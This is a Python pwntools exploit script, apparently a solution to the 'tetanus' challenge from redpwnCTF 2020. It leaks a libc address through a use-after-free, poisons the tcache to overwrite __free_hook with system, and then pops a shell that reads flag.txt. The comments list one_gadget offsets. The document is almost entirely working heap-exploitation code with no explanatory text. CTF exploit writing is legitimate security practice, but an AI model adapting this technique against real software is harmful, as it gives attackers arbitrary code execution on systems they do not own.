#0xe6b93 execve("/bin/sh", r10, r12)
#constraints:
#  [r10] == NULL || r10 == NULL
#  [r12] == NULL || r12 == NULL
#
#0xe6b96 execve("/bin/sh", r10, rdx)
#constraints:
#  [r10] == NULL || r10 == NULL
#  [rdx] == NULL || rdx == NULL
#
#0xe6b99 execve("/bin/sh", rsi, rdx)
#constraints:
#  [rsi] == NULL || rsi == NULL
#  [rdx] == NULL || rdx == NULL
#
#0x10afa9 execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL

from pwn import *
from sys import argv

list_count = 0

def create(p, size):
    global list_count
    p.sendlineafter('7. Exit', '1')
    p.sendlineafter('big should this list be?', str(size))
    p.recvuntil('Done!')
    list_count += 1
    return list_count - 1

def delete(p, index):
    log.info(f'Deleting {index}')
    p.sendlineafter('7. Exit', '2')
    p.sendlineafter('Which list do you want to delete?', str(index))
    p.recvuntil('Done!')


def append(p, list_index, count, elements):
    p.sendlineafter('7. Exit', '5')
    p.sendlineafter('Which list do you want to append to?', str(list_index))
    p.sendlineafter('How many elements do you want to append?', str(count))

    for x in elements:
        p.sendlineafter('What value should be inserted?', str(x))


def view(p, list_index, element_index):
    p.sendlineafter('7. Exit', '6')
    p.sendlineafter('Which list do you want to view?', str(list_index))
    p.sendlineafter('Which element do you want to view?', str(element_index))
    p.recvuntil('Value: ')
    return int(p.recvline().decode('ascii'))


def edit(p, list_index, element_index, value):
    p.sendlineafter('7. Exit', '3')
    p.sendlineafter('Which list do you want to edit?', str(list_index))
    p.sendlineafter('Okay, which element do you want to edit?', str(element_index))
    p.sendlineafter('What do you want to set it to?', str(value))


if 'remote' in argv:
    p = remote('2020.redpwnc.tf', 31069)
elif 'debug' in argv:
    p = gdb.debug('./tetanus', 'c')
else:
    p = process('./tetanus')
libc_elf = ELF('./libc.so.6')

# leak libc
create(p, 160)
append(p, 0, 2, [1337, 420])
delete(p, 0)
libc_base = view(p, 0, 1) - (0x7f1fa7022be0 - 0x00007f1fa6e38000)
hook_addr = libc_base + libc_elf.sym['__free_hook']
log.info(f'Libc: {hex(libc_base)}')
log.info(f'Hook addr: {hex(hook_addr)}')


# attack tcache
gadgets = [0xe6b93, 0xe6b96, 0xe6b99, 0x10afa9]
gadget_addr = libc_base + gadgets[2]
gadget_addr = libc_base + libc_elf.sym['system']
log.info(f'Gadget: {hex(gadget_addr)}')
input('blocking')

a = create(p, 5)
b = create(p, 5)
c = create(p, 5)
append(p, a, 5, [1, 2, 3, 4, 5])
append(p, b, 5, [1, 2, 3, 4, 5])
delete(p, a)
delete(p, b)
delete(p, c)
edit(p, b, 0, hook_addr)

create(p, 5)
create(p, 5)
hook = create(p, 5)
p.sendlineafter('7. Exit', '5')
p.sendlineafter('Which list do you want to append to?', str(hook))
p.sendlineafter('How many elements do you want to append?', str(1))
p.sendlineafter('What value should be inserted?', str(gadget_addr) + '\n cat flag.txt')
#append(p, hook, 1, [gadget_addr])
#p.sendafter('7. Exit', '\x00')
p.interactive()
